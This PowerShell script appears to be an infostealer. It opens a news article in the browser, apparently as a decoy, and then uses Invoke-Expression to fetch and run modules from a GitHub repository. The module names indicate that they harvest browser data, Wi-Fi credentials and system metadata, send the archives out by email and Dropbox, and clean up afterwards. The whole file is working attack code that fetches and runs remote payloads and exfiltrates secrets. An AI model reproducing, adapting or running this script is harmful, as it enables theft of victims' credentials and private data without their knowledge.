param (
    [Parameter()]
    [String]$email_username,
    [String]$email_password,
    [string]$dropbox_token
)

# Admin powershell
# Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Start-Process https://www.globes.co.il/news/article.aspx?did=1001425931

Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/prepare_work_folder.ps1) }"

Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/grab_browsers_data.ps1) } browserdata.zip"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $email_username $email_password $env:appdata\Microsoft\dump\browserdata.zip"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_dropbox.ps1) } $env:appdata\Microsoft\dump\browserdata.zip $dropbox_token"

Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/grab_wifi_creds.ps1) } wifi_creds.zip"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $email_username $email_password $env:appdata\Microsoft\dump\wifi_creds.zip"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_dropbox.ps1) } $env:appdata\Microsoft\dump\wifi_creds.zip $dropbox_token"

Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/grab_meta_information.ps1) } meta_info.zip"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $email_username $email_password $env:appdata\Microsoft\dump\meta_info.zip"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_dropbox.ps1) } $env:appdata\Microsoft\dump\meta_info.zip $dropbox_token"

Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/cleanup.ps1) }"